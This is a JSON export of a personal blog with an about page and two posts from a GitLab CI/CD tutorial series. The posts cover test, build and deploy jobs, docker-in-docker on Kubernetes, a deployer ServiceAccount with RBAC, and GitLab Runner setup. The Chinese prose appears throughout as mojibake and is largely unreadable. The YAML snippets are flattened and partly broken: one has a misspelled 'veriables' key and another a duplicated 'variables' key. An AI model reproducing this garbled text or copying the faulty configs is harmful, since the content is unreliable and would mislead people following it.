{"meta":{"title":"Stdio's Blog","subtitle":"éšä¾¿å†™å†™","description":null,"author":"David Dai","url":"https://blog.stdioa.com"},"pages":[{"title":"404!","date":"1969-12-31T16:00:00.000Z","updated":"2017-06-29T04:38:39.767Z","comments":false,"path":"404.html","permalink":"https://blog.stdioa.com/404.html","excerpt":"","text":"404 Not Foundç‚¹å‡»å·¦ä¾§å¤´åƒè¿”å›é¦–é¡µ"},{"title":"å…³äºæˆ‘","date":"2018-07-11T13:41:47.303Z","updated":"2018-07-11T13:41:47.303Z","comments":false,"path":"about/index.html","permalink":"https://blog.stdioa.com/about/index.html","excerpt":"","text":"ç®€ä»‹æ˜µç§°ï¼šå°æˆ´ã€‚å¾ˆå¤šå§“æˆ´çš„äººéƒ½æœ‰è¿™æ ·ä¸€ä¸ªæ˜µç§° ğŸ˜‚å—äº¬èˆªç©ºèˆªå¤©å¤§å­¦ 2013çº§ ä¿¡æ¯å®‰å…¨ä¸“ä¸šLCTT æˆå‘˜ï¼Œæ‰‡è´ç½‘åç«¯å·¥ç¨‹å¸ˆæ›¾ç»æ˜¯å¤©å¤©ç¼ºè§‰çš„â€œç‰¹å›°ç”Ÿâ€ï¼Œç„¶è€Œç°åœ¨å¤©å¤©æ—©ç¡æ—©èµ·ï¼ˆç®—æ˜¯å§ï¼‰è¢«åŒå­¦ç§°ä¸ºâ€œé‡‘é™µä¸ˆé‡è€…â€ï¼Œå¸Œæœ›æœ‰ä¸€å¤©èƒ½å¤Ÿèµ°éå—äº¬äººç”Ÿè‹¦çŸ­ï¼Œæˆ‘ç”¨ Python ä¸šä½™çˆ±å¥½ç¾½æ¯›çƒã€ä¹’ä¹“çƒã€å¤å…¸éŸ³ä¹ã€é’¢ç´ã€å’–å•¡ã€‚ æ¶‰çŒé¢†åŸŸ ç¼–ç¨‹è¯­è¨€C / C++ / Python / Go(åˆšåˆšå¼€å§‹) / Node.js Web å¼€å‘å‰ç«¯: HTML / CSS / Javascript(ES6)ç»„ä»¶åº“ï¼šReact.js(ä¼šä¸€ç‚¹) / Vue.js (Vue.js + vuex + vue-router)æ ·å¼åº“ï¼šSemantic UIåç«¯:Web æ¡†æ¶ï¼šFlask / Django / Bottle / ExpressRPC æ¡†æ¶ï¼šgRPC / seaæ•°æ®åº“: MySQL / MongoDBï¼ˆäº†è§£ï¼‰ / Redis DevOpsKubernetes / GitLab CI/CD ç¼–ç¨‹å·¥å…·ä»£ç ç¼–è¾‘å™¨: Sublime Textç‰ˆæœ¬æ§åˆ¶: Gitï¼ˆç†Ÿç»ƒï¼‰ä»£ç æ„å»º: gulp, babel, webpack ä¸ªäººé¡µé¢Githubä»“åº“Codingä»“åº“åšå®¢ï¼ˆGithub Pagesåˆ†æµï¼‰æˆ‘çš„ä¹è°±åˆ†äº«ç«™ è”ç³»æˆ‘E-mail: c3RkaW9hQDE2My5jb20=Telegram: @StdioA"},{"title":"å‹æƒ…é“¾æ¥","date":"2018-07-11T13:28:36.761Z","updated":"2018-07-11T13:28:36.761Z","comments":true,"path":"links/index.html","permalink":"https://blog.stdioa.com/links/index.html","excerpt":"","text":"Resxkz"},{"title":"åˆ†ç±»","date":"2018-07-11T13:26:13.094Z","updated":"2018-07-11T12:29:12.213Z","comments":false,"path":"categories/index.html","permalink":"https://blog.stdioa.com/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2018-07-11T12:29:12.214Z","updated":"2018-07-11T12:29:12.214Z","comments":false,"path":"repository/index.html","permalink":"https://blog.stdioa.com/repository/index.html","excerpt":"","text":""},{"title":"æ ‡ç­¾","date":"2018-07-11T12:29:12.215Z","updated":"2018-07-11T12:29:12.215Z","comments":false,"path":"tags/index.html","permalink":"https://blog.stdioa.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"GitLab CI/CD åŸºç¡€æ•™ç¨‹ï¼ˆä¸‰ï¼‰","slug":"gitlab-cicd-usage","date":"2018-06-23T12:53:00.000Z","updated":"2018-06-24T02:34:16.511Z","comments":true,"path":"2018/06/gitlab-cicd-usage/","link":"","permalink":"https://blog.stdioa.com/2018/06/gitlab-cicd-usage/","excerpt":"å‰ä¸¤ç¯‡æˆ‘ä»¬è®²äº† GitLab CI/CD çš„ç®€å•åº”ç”¨åŠéƒ¨ç½²æ–¹å¼ï¼Œè¿™ä¸€ç¯‡ç®€å•è®²ä¸€ä¸‹å¦‚ä½•å°† GitLab CI/CD ä¸æ—¥å¸¸å¼€å‘éƒ¨ç½²æµç¨‹ç»“åˆã€‚","text":"å‰ä¸¤ç¯‡æˆ‘ä»¬è®²äº† GitLab CI/CD çš„ç®€å•åº”ç”¨åŠéƒ¨ç½²æ–¹å¼ï¼Œè¿™ä¸€ç¯‡ç®€å•è®²ä¸€ä¸‹å¦‚ä½•å°† GitLab CI/CD ä¸æ—¥å¸¸å¼€å‘éƒ¨ç½²æµç¨‹ç»“åˆã€‚ 0. TL;DRçœ‹æ–‡æ¡£ï¼Ÿå…¶å®å°±æ˜¯ç®€å•åº”ç”¨å§ã€‚.gitlab-ci.yml çš„å®Œæ•´é…ç½®å®šä¹‰å¯ä»¥è§ç¬¬ä¸€ç¯‡åšæ–‡ã€‚ 1. æµ‹è¯•é˜¶æ®µæµ‹è¯•é˜¶æ®µæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œåªéœ€è¦æŠŠ runner tag æ‰“å¥½ï¼ˆæ³¨å†Œæ—¶ä½¿ç”¨ --tag-list å‚æ•°ï¼‰ï¼ŒåŸºäº docker/k8s æŠŠ Runner æ­èµ·æ¥ï¼ŒåŸºæœ¬ä¸Šå°±å¯ä»¥è‡ªåŠ¨è¿è¡Œäº†ã€‚.gitlab-ci.yml é…ç½®å¦‚ä¸‹ï¼š123456789101112131415test_all: image: \"pymicro\" stage: test services: - name: mysql:5.6 alias: mysql command: [\"mysqld\", \"--character-set-server=utf8mb4\", \"--collation-server=utf8mb4_unicode_ci\"] veriables: MYSQL_DATABASE: db MYSQL_ROOT_PASSWORD: password before_script: - pip install -U -r requirements.txt script: - flake8 app - pytest testsè¿™é‡Œå®šä¹‰çš„ä¸¤ä¸ªç¯å¢ƒå˜é‡éƒ½æ˜¯ç»™ MySQL æœåŠ¡ç”¨çš„ï¼Œmysql é•œåƒä¼šåœ¨å®¹å™¨å¯åŠ¨æ—¶è¯»å–æŸäº›ç¯å¢ƒå˜é‡ï¼Œæ¥é…ç½®æ•°æ®åº“ã€‚å…·ä½“æ”¯æŒçš„ç¯å¢ƒå˜é‡å¯ä»¥å‚è€ƒ MySQL çš„ docker image é¡µé¢ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ service ä¸­è‡ªå®šä¹‰å¯åŠ¨å‘½ä»¤ï¼Œè¿™é‡Œæˆ‘å°† MySQL çš„é»˜è®¤å­—ç¬¦é›†è®¾ç½®æˆäº† utf8mb4ï¼Œå¦åˆ™æœåŠ¡å™¨ä¸­çš„æ•°æ®åº“å­—ç¬¦é›†ä¼šæ˜¯ latin1.éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼ŒåŸºäº Docker éƒ¨ç½²çš„ Runnerï¼Œå¯ä»¥ä½¿ç”¨æœåŠ¡åˆ«å, ä¹Ÿå°±æ˜¯åœ¨è·‘æµ‹è¯•çš„é˜¶æ®µä¸­ï¼Œå¯ä»¥é€šè¿‡ service alias è®¿é—®åˆ°å¯¹åº”çš„æœåŠ¡ï¼›è€ŒåŸºäº Kubernetes çš„ Runner ä¸æ”¯æŒï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡ 127.0.0.1 è®¿é—®ã€‚ 2. æ„å»ºé˜¶æ®µæ„å»ºé˜¶æ®µä¸­ï¼Œæˆ‘ä»¬ä¼šç”¨ Docker å°†å·¥ç¨‹æ‰“åŒ…æˆé•œåƒï¼Œå¹¶æ¨é€åˆ°è¿œç«¯ registry. 2.1 åŸºæœ¬é…ç½®.gitlab-ci.yml é…ç½®å¦‚ä¸‹ï¼š123456789101112131415161718build_image: image: \"docker:17.11\" stage: build services: - name: \"docker:17.12.0-ce-dind\" alias: dockerd variables: DOCKER_HOST: tcp://127.0.0.1:2375 IMAGE: docker.registry/name/$&#123;CI_PROJECT_NAMESPACE&#125;-$&#123;CI_PROJECT_NAME&#125; before_script: - IMAGE_TAG=$&#123;IMAGE&#125;:$&#123;CI_COMMIT_SHA:0:8&#125; only: - master tags: - build script: - docker build -t $&#123;IMAGE_TAG&#125; -f Dockerfile . - docker push $&#123;IMAGE_TAG&#125;åœ¨è¿™ä¸ªä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å¯ç”¨äº†ä¸€ä¸ª dind ä½œä¸º serviceï¼Œå¹¶ä½¿ç”¨ DOCKER_HOST ç¯å¢ƒå˜é‡æ¥è®© docker å‘½ä»¤ä¸æˆ‘ä»¬çš„ dind æœåŠ¡é€šä¿¡ã€‚ä»»åŠ¡æ‰§è¡Œæ—¶ï¼Œä¼šæ ¹æ®é¡¹ç›®ä¸­çš„ Dockerfile æ„å»ºå¹¶æ¨é€é•œåƒã€‚æˆ‘ä»¬çš„é•œåƒåç§°ä½¿ç”¨äº†é¡¹ç›®ç»„å + é¡¹ç›®åçš„é…ç½®ï¼Œtag ä½¿ç”¨ commit SHA å‰å…«ä½æ¥æ„æˆã€‚å› ä¸ºåœ¨ variable å­—æ®µä¸­å®šä¹‰ç¯å¢ƒå˜é‡æ—¶ï¼Œä¸èƒ½ä½¿ç”¨ ${CI_COMMIT_SHA:0:8} è¿™ç§ shell å­—ç¬¦ä¸²æ“ä½œï¼Œæ‰€ä»¥åªå¥½åœ¨ before_script ä¸­æ¥å®šä¹‰è¿™ä¸ªç¯å¢ƒå˜é‡ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬éœ€è¦åœ¨ docker ç¯å¢ƒä¸­å¯åŠ¨ä¸€ä¸ª dindï¼Œæ¥ä½œä¸ºæ„å»ºæ—¶æ‰€ç”¨çš„æœåŠ¡å™¨ã€‚å€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œå¦‚æœä½ éœ€è¦ä½¿ç”¨ dindï¼Œåˆ™ dind æ‰€åœ¨çš„ container åº”è¯¥å…·æœ‰ç‰¹æƒï¼ˆå®˜æ–¹æ–‡æ¡£ä¹Ÿæœ‰è®²åˆ°ï¼‰ã€‚æ‰€ä»¥åœ¨ Runner æ³¨å†Œæ—¶ï¼Œéœ€è¦åŠ ä¸Š --docker-privileged æˆ– --kubernetes-privileged å‚æ•°ï¼ˆå…·ä½“è§†æ‰§è¡Œå¹³å°è€Œå®šï¼‰ï¼Œæ¥ä½¿ job è¿è¡Œæ—¶æ‰€åœ¨çš„ container æ‹¥æœ‰ç‰¹æƒã€‚ä¸è¿‡ï¼Œåœ¨éƒ¨ç½² runner æ—¶ï¼ŒRunner daemon æ‰€éœ€çš„ container å¹¶ä¸éœ€è¦è¿™ä¸ªç‰¹æƒï¼ˆå…¶å®å¯ä»¥æœºå™¨ä¸Šçš„ docker service æˆ–è€…æ“æ§ pod å·²ç»æ˜¯ä¸€ç§ç‰¹æƒäº†ğŸ˜‚ï¼‰ã€‚ 2.2 dind æœåŠ¡è°ƒï¼ˆluanï¼‰ä¼˜ï¼ˆgaoï¼‰ 2.2.1 dind æˆä¸ºç‹¬ç«‹æœåŠ¡ä¸Šé¢å®šä¹‰çš„ job ä¸­ï¼Œdind æ˜¯ä¸€ä¸ª job serviceï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡æ„å»ºçš„æ—¶å€™éƒ½ä¼šä»å¤´å¼€å§‹æ„å»ºã€‚è€Œ docker æ„å»ºæä¾›äº†ä¸€å¥—æ¯”è¾ƒå®Œå–„çš„ç¼“å­˜åŠŸèƒ½ï¼Œå¦‚æœ Dockerfile æŸå‡ å±‚çš„æ„å»ºå‘½ä»¤å®Œå…¨ä¸€æ ·ï¼ˆæ¯”å¦‚åªæ˜¯ RUN apt-get install xxxï¼‰çš„è¯ï¼ŒDocker ä¼šåœ¨å†æ¬¡æ„å»ºæ—¶è‡ªåŠ¨ä½¿ç”¨ä¹‹å‰å·²ç»æ„å»ºå¥½çš„å±‚ï¼Œè¿™æ ·å¯ä»¥å‡å°‘æ„å»ºæ—¶é—´ã€‚æ‰€ä»¥æˆ‘åœ¨åšå®Œä¸Šé¢çš„é‚£ä¸ªæµç¨‹ä¹‹åç«‹åˆ»æ„è¯†åˆ°äº†è¿™ä¸€ç‚¹ï¼Œäºæ˜¯å•ç‹¬æŠŠ dind ä» CI ä»»åŠ¡ä¸­æŠ½ç¦»äº†å‡ºæ¥ï¼Œåœ¨ k8s namespace ä¸­å•ç‹¬æ­å»ºäº†ä¸€ä¸ª dind æœåŠ¡ï¼Œå¹¶å®šä¹‰äº† k8s serviceï¼Œè€Œ job ä¸­çš„ DOCKER_HOST ç¯å¢ƒå˜é‡ä¹Ÿæ”¹æˆäº† tcp://dockerd:2375ï¼Œå› ä¸º dind å¹¶ä¸åœ¨ job pod é‡Œäº†ï¼Œè€Œæ˜¯ä¸€ä¸ª k8s serviceï¼Œéœ€è¦é€šè¿‡ DNS æ¥è·å–åˆ°å…·ä½“çš„ IP.è¿™æ ·ä¸€æ¥ï¼Œåœ¨ job ç»“æŸåï¼Œdind ä¾ç„¶å­˜åœ¨ï¼Œå¹¶ä¼šä¿ç•™å‰ä¸€æ¬¡çš„æ„å»ºå±‚ï¼Œè¿™æ ·ä¸‹æ¬¡æ„å»ºçš„æ—¶å€™å°±å¯ä»¥è·³è¿‡ä¾èµ–å®‰è£…æ­¥éª¤ï¼Œå¤§å¤§ç¼©çŸ­äº†æ„å»ºæ‰€éœ€çš„æ—¶é—´ã€‚åœ¨ k8s ä¸­æ­å»º dind æœåŠ¡çš„å†…å®¹ä¸åœ¨æœ¬åšæ–‡è®²è¿°èŒƒå›´å†…ï¼Œæƒ³æ­å»ºçš„è¯ï¼Œå¯ä»¥å» Google ä¸€ä¸‹ã€‚ 2.2.2 å°¼ç›â€¦ Node å­˜å‚¨ç©ºé—´æ»¡äº†ï¼Ÿåœ¨æˆ‘ä»¬çš„ dind æœåŠ¡è¿è¡Œèµ·æ¥ä¸€æ®µæ—¶é—´åï¼Œå°±é‡åˆ°äº†ä¸€ä¸ªå°´å°¬çš„é—®é¢˜ï¼šdind æœåŠ¡å ç”¨äº†å¤ªå¤šå­˜å‚¨ç©ºé—´ï¼Œå¯¼è‡´ pod çš„æ‰€åœ¨ node å‡ºç°äº†é—®é¢˜â€¦è¿™ä¸ªé—®é¢˜æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼šä¸€æ˜¯å•ç‹¬åšä¸€ä¸ª nodeï¼Œå¹¶ç”¨ node selector å°† dind å•ç‹¬æ”¾åœ¨é‚£ä¸ª node ä¸Šï¼Œä»¥é¿å…å½±å“å…¶å®ƒæœåŠ¡ï¼›äºŒæ˜¯ä¸º dind å•ç‹¬æŒ‚ä¸€ä¸ª volumeï¼Œä½¿ç”¨ PersistentVolume è¿›è¡ŒæŒä¹…åŒ–å­˜å‚¨ã€‚è€Œæˆ‘å¸çš„è§£å†³æ–¹æ¡ˆç®€ç›´æ˜¯éªšæ–­è…¿ï¼šå•ç‹¬ä¹°ä¸€å° VPSï¼Œåœ¨ä¸Šé¢æ­ä¸€ä¸ª docker æœåŠ¡å™¨ï¼Œç„¶åæŠŠè¿™ä¸ªæœåŠ¡å¼•å…¥ k8s é›†ç¾¤ä¸­ ğŸ˜‚æ‰€ä»¥ï¼Œåœ¨æ­å»ºå¥½æœåŠ¡å™¨ä¹‹åï¼Œä¿®æ”¹ k8s ä¸­çš„ Serviceï¼Œä¸º Service æ·»åŠ  Endpointï¼Œæ³¨æ„ç«¯ç‚¹åç§°è¦ä¸æœåŠ¡åç§°ä¸€è‡´ï¼š1234567891011121314151617181920212223242526kind: Servicemetadata: name: dockerd namespace: cicd labels: app: dockerdspec: ports: - protocol: TCP port: 2375 targetPort: 2375 clusterIP: None---kind: EndpointsapiVersion: v1metadata: name: dockerd namespace: cicd labels: app: dockerdsubsets: - addresses: - ip: 192.168.8.45 ports: - port: 2375è¿™æ ·æˆ‘ä»¬åœ¨é›†ç¾¤ä¸­æŸ¥çœ‹ dockerd çš„ IP åœ°å€æ—¶ï¼Œå°±ä¼šå¾—åˆ°é‚£å° VPS çš„ IP äº†ã€‚ç„¶åâ€¦è®°å¾—å†™ä¸ª cron jobï¼Œå®šæœŸæ¸…ç† docker æœåŠ¡å™¨ä¸Šçš„ç¼“å­˜ï¼Œå¦åˆ™ç¡¬ç›˜ä¹Ÿæ˜¯ä¼šæ»¡çš„_(:Ğ·ã€âˆ )_ã€‚ 3. éƒ¨ç½²é˜¶æ®µéƒ¨ç½²é˜¶æ®µä¸­ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨ kubectl set image å‘½ä»¤ï¼Œå¯¹ç‰¹å®š Deployment è§¦å‘ä¸€æ¬¡æ»šåŠ¨æ›´æ–°ã€‚.gitlab-ci.yml é…ç½®ï¼š12345678910111213141516deploy_production: image: \"kubectl:1.8.1\" stage: deploy variables: GIT_STRATEGY: none variables: IMAGE: docker.registry/name/$&#123;CI_PROJECT_NAMESPACE&#125;-$&#123;CI_PROJECT_NAME&#125; before_script: - IMAGE_TAG=$&#123;IMAGE&#125;:$&#123;CI_COMMIT_SHA:0:8&#125; only: - master when: manual tags: - deploy-production script: - kubectl set image deploy/myproject \"app=$&#123;IMAGE_TAG&#125;\" --recordè¿™é‡Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª GIT_STRATEGY ç¯å¢ƒå˜é‡ï¼Œæœ‰äº†è¿™ä¸ªå˜é‡ï¼Œåœ¨ CD ä»»åŠ¡æ‰§è¡Œæ—¶ï¼ŒRunner ä¼šè·³è¿‡å…‹éš†ä»£ç çš„æ­¥éª¤ï¼Œå› ä¸ºåœ¨è¿™ä¸ªé˜¶æ®µä¸­æˆ‘ä»¬å¹¶ä¸éœ€è¦é¡¹ç›®ä»£ç ã€‚è€Œ when: manual å±æ€§è¡¨ç¤ºè¿™ä¸ªä»»åŠ¡éœ€è¦æ‰‹åŠ¨è§¦å‘ã€‚è¿™ä¸ªé˜¶æ®µä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª ServiceAccount æ¥è®© pod ä½¿ç”¨ kubectl ä¸é›†ç¾¤é€šä¿¡ï¼›åŒæ—¶ä¸ºäº†ä¿è¯ set image å‘½ä»¤çš„æˆåŠŸæ‰§è¡Œï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸ºè¿™ä¸ªè´¦æˆ·èµ‹äºˆä¸€äº›æƒé™ã€‚1234567891011121314151617181920212223242526272829apiVersion: v1kind: ServiceAccountmetadata: name: deployer namespace: cicdimagePullSecrets:- name: dockersecret---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata: name: deployerrules: - apiGroups: [\"extensions\"] resources: [\"deployments\"] verbs: [\"get\", \"patch\"]---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: name: cicd-deployersubjects:- kind: ServiceAccount name: deployer namespace: cicdroleRef: kind: ClusterRole name: deployer apiGroup: rbac.authorization.k8s.ioåŒæ—¶ï¼Œåœ¨æˆ‘ä»¬æ³¨å†Œè¿™ä¸ª runner æ—¶ï¼Œéœ€è¦åŠ ä¸Š --kubernetes-service-account deployer å‚æ•°ï¼Œè¿™æ ·åœ¨ job pod å¯åŠ¨æ—¶ï¼Œé›†ç¾¤å°† deployer è´¦æˆ·çš„å‡­æ®æ³¨å…¥è¿› podï¼Œkubectl å‘½ä»¤æ‰èƒ½æ­£å¸¸ä½¿ç”¨ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬ï¼ˆåº”è¯¥ï¼‰å¯ä»¥å®ç°å¹¶éƒ¨ç½²ä¸€å¥—å®Œæ•´çš„æµ‹è¯•â†’æ„å»ºâ†’éƒ¨ç½²æµç¨‹ã€‚è¿™ä¸ªç³»åˆ—åˆ°æ­¤ä¹Ÿå°±ç»“æŸäº†ï¼Œåé¢è¿˜ä¼šæœ‰ä¸€ç¯‡ï¼Œè®²ç‚¹å‘¨è¾¹çš„å°å·¥ï¼ˆç©ï¼‰å…·ã€‚","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/tags/DevOps/"},{"name":"GitLab","slug":"GitLab","permalink":"https://blog.stdioa.com/tags/GitLab/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://blog.stdioa.com/tags/CI-CD/"}]},{"title":"GitLab CI/CD åŸºç¡€æ•™ç¨‹ï¼ˆäºŒï¼‰","slug":"gitlab-cicd-deploy","date":"2018-06-18T07:46:00.000Z","updated":"2018-06-18T08:16:53.589Z","comments":true,"path":"2018/06/gitlab-cicd-deploy/","link":"","permalink":"https://blog.stdioa.com/2018/06/gitlab-cicd-deploy/","excerpt":"æœ¬æ–‡æ˜¯ GitLab CI/CD ç³»åˆ—çš„ç¬¬äºŒç¯‡ï¼Œä¸»è¦ä»‹ç» GitLab CI Runner åœ¨ Docker å’Œ Kubernetes ç¯å¢ƒä¸‹çš„éƒ¨ç½²æ–¹å¼ã€‚","text":"æœ¬æ–‡æ˜¯ GitLab CI/CD ç³»åˆ—çš„ç¬¬äºŒç¯‡ï¼Œä¸»è¦ä»‹ç» GitLab CI Runner åœ¨ Docker å’Œ Kubernetes ç¯å¢ƒä¸‹çš„éƒ¨ç½²æ–¹å¼ã€‚ 0. TL;DRæ–‡æ¡£åœ¨è¿™å„¿ã€‚ 1. GitLab Runner çš„è¿è¡Œç¯å¢ƒåŠæ‰§è¡Œç¯å¢ƒé€‰æ‹©GitLab Runner ç”¨ Go è¯­è¨€å†™æˆï¼Œæœ€åæ‰“åŒ…æˆå•æ–‡ä»¶è¿›è¡Œåˆ†å‘ï¼Œæ‰€ä»¥å¯ä»¥åœ¨å¾ˆå¤šå¹³å°ä¸‹å¿«é€Ÿè¿è¡Œï¼ŒåŒ…æ‹¬ Windows / GNU Linux / MacOS ç­‰ï¼ŒåŒæ—¶ä¹Ÿæä¾› Docker é•œåƒï¼Œæ–¹ä¾¿åœ¨ Docker / Kubernetes ç¯å¢ƒä¸­éƒ¨ç½²ã€‚ä½†é™¤äº† Runner è¿è¡Œå¤–ï¼ŒRunner è¿˜éœ€è¦ä¸€ä¸ªç¯å¢ƒæ¥è¿è¡Œ jobs. è¿™ä¸ªç¯å¢ƒç§°ä¹‹ä¸ºæ‰§è¡Œç¯å¢ƒï¼ˆexecutorï¼‰ã€‚GitLab Runner æ”¯æŒå¤šç§æ‰§è¡Œç¯å¢ƒï¼ŒåŒ…æ‹¬ SSHï¼ŒDockerï¼ŒVirtualBox ç­‰ã€‚ä¸åŒæ‰§è¡Œç¯å¢ƒå¯¹ GitLab CI/CD ä¸åŒåŠŸèƒ½çš„æ”¯æŒæƒ…å†µï¼Œå¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£ä¸­çš„å…¼å®¹æ€§è¡¨æ ¼ã€‚ç”±äºæˆ‘å¸ä¸»è¦ç”¨ Docker æˆ– Kubernetes æ¥æ‰˜ç®¡æœåŠ¡ï¼Œå¹¶ä¸”åœ¨è¿›è¡Œæµ‹è¯•æ—¶éœ€è¦ service çš„æ”¯æŒï¼Œæ‰€ä»¥è‡ªç„¶åªå‰©ä¸‹äº†ä¸¤ç§é€‰æ‹©ï¼ŒDocker å’Œ Kubernetes. åœ¨ä¸‹æ–‡ä¸­ä¼šè®²è§£ GitLab åœ¨ Docker å’Œ Kubernetes ä¸­çš„éƒ¨ç½²æ–¹å¼ã€‚å°½ç®¡è¿è¡Œç¯å¢ƒå’Œæ‰§è¡Œç¯å¢ƒå¯ä»¥ç›¸äº’ç‹¬ç«‹ï¼Œä½†ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œæˆ‘æ›´æ¨èåœ¨åŒä¸€ä¸ªç¯å¢ƒä¸­è¿è¡Œ runner daemon å’Œ jobs. 2. GitLab Runner éƒ¨ç½²ç®€å•æ¥è®²ï¼ŒGitLab Runner çš„éƒ¨ç½²æ–¹å¼åˆ†ä¸ºä¸¤æ­¥ï¼šè¿è¡Œã€æ³¨å†Œã€‚ 2.1 æ³¨å†Œ runneråœ¨ä¸€ä¸ª runner daemon è¿›ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åŒæ—¶æ³¨å†Œå¹¶è¿è¡Œå¤šä¸ª runnerï¼Œæ¥å¹¶è¡Œå®Œæˆå¤šä¸ªåœºæ™¯ä¸‹çš„ä¸åŒä»»åŠ¡ã€‚æ³¨å†Œçš„æ­¥éª¤åœ¨ä¸åŒå¹³å°ä¸‹å¤§åŒå°å¼‚ï¼šè¿è¡Œ gitlab-runner register å‘½ä»¤ï¼Œä¼šè¾“å‡ºä¸€ä¸ªäº¤äº’ç•Œé¢ï¼Œåœ¨é‡Œé¢ä¾æ¬¡è¾“å…¥ GitLab å®ä¾‹åœ°å€ã€CI Tokenã€Runner æè¿°ã€æ ‡ç­¾åˆ—è¡¨ï¼ˆç”¨äºåŒºåˆ†ä¸åŒç±»å‹çš„ Runnerï¼Œä½¿ä¸åŒé˜¶æ®µçš„ job åœ¨ä¸åŒçš„ Runner ä¸­è¿è¡Œï¼‰ã€æ‰§è¡Œç¯å¢ƒç±»å‹ï¼Œå¦‚æœé€‰æ‹©åŸºäº Docker çš„æ‰§è¡Œç¯å¢ƒï¼Œåˆ™éœ€è¦å†è¾“å…¥ä¸€ä¸ªç¼ºçœçš„ job image.æ³¨å†Œä¹‹åï¼ŒRunner ä¼šå°†é…ç½®å†™å…¥ /etc/gitlab-runner/config.toml æ–‡ä»¶ä¸­ï¼Œå¦‚æœæ–‡ä»¶å†…å®¹ä¸ä¸¢å¤±ï¼Œgitlab-runner ç¨‹åºä¼šè‡ªåŠ¨è¯»å–é…ç½®å†…å®¹å¹¶è¿è¡Œï¼Œæ— éœ€é‡å¤æ³¨å†Œã€‚å½“ç„¶ï¼Œå¦‚æœä½ éœ€è¦ä¸€äº›æ›´é«˜çº§çš„é…ç½®ï¼Œåˆ™å¯ä»¥ç›´æ¥ä¿®æ”¹ config.toml. å…·ä½“çš„é…ç½®å¯ä»¥è§å®˜æ–¹æ–‡æ¡£ã€‚åœ¨é…ç½®æ–‡ä»¶æ›´æ”¹åï¼Œrunner daemon ä¼šè‡ªåŠ¨é‡æ–°åŠ è½½é…ç½®ï¼Œæ— éœ€é‡å¯ã€‚æ­¤å¤–ï¼Œgitlab-runner register éå¸¸é¬¼ç•œçš„ä¸€ç‚¹åœ¨äºï¼Œconfig.toml ä¸­çš„éƒ¨åˆ†é…ç½®å¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡æ³¨å…¥ï¼Œä¸”æ‰€æœ‰é…ç½®éƒ½å¯ä»¥é€šè¿‡æ³¨å†Œå‘½ä»¤çš„å‚æ•°ä¼ å…¥ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ å¸Œæœ›ä¸æ¥è§¦ config.tomlï¼Œåªä½¿ç”¨ä¸€æ¡å‘½ä»¤æ¥é…ç½®å¹¶æ³¨å†Œå•ä¸ª runnerï¼Œgitlab-runner register å‘½ä»¤å®Œå…¨å¯ä»¥æ»¡è¶³ä½ çš„è¦æ±‚ã€‚ğŸŒš 2.2 åœ¨ Docker ç¯å¢ƒä¸­éƒ¨ç½²ä¸€å¥è¯ï¼š12345docker run -d --name gitlab-runner --restart always \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v /data/gitlab-runner/conf:/etc/gitlab-runner \\ --net=host \\ gitlab/gitlab-runner:latestæ³¨æ„ï¼šæˆ‘ä»¬åœ¨è¿™é‡Œå°† /var/run/docker.sock æŒ‚è½½è¿›äº† gitlab-runner å®¹å™¨ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å°† Docker ç¯å¢ƒçš„æ§åˆ¶æƒäº¤ç»™äº† runner daemonï¼Œè¿™æ · runner daemon å¯ä»¥åœ¨æ”¶åˆ°ä»»åŠ¡æŒ‡ä»¤æ—¶ï¼Œä½¿ç”¨å½“å‰ Docker ç¯å¢ƒä½œä¸ºæ‰§è¡Œç¯å¢ƒï¼Œåœ¨é‡Œé¢è¿è¡Œå®¹å™¨ä»¥æ‰§è¡Œä»»åŠ¡ã€‚å½“ç„¶ï¼Œè¿™æ ·æŒ‚è½½æ˜¯ä¸€ç§ç›¸å½“å±é™©çš„åšæ³•ã€‚å¦‚æœä½ æ¯”è¾ƒæ‹…å¿ƒå®‰å…¨é—®é¢˜ï¼Œå¯ä»¥è€ƒè™‘åšä¸€ä¸ª docker composeï¼Œå¹¶åœ¨é‡Œé¢è¿è¡Œä¸€ä¸ª dind ï¼ˆDocker in Dockerï¼‰æ¥ä½œä¸º Runner çš„æ‰§è¡Œç¯å¢ƒã€‚ 2.3 åœ¨ Kubernetes ç¯å¢ƒä¸­éƒ¨ç½²åœ¨ k8s ç¯å¢ƒä¸­çš„éƒ¨ç½²è¦ç¨å¾®å¤æ‚ä¸€äº›ï¼ˆå› ä¸ºé…ç½®æ–‡ä»¶å¤ªé•¿ğŸ˜‚ï¼‰ï¼Œå¤§ä½“éœ€è¦é…ç½®ä»¥ä¸‹äº”éƒ¨åˆ†ï¼šä¸€ä¸ªæˆ–è€…ä¸¤ä¸ª Namespaceï¼ˆå–å†³äºä½ æ˜¯å¦è¦æŠŠ job pod å’Œ daemon æ”¾åœ¨åŒä¸€ä¸ª namespace é‡Œï¼‰ä¸€ä¸ª 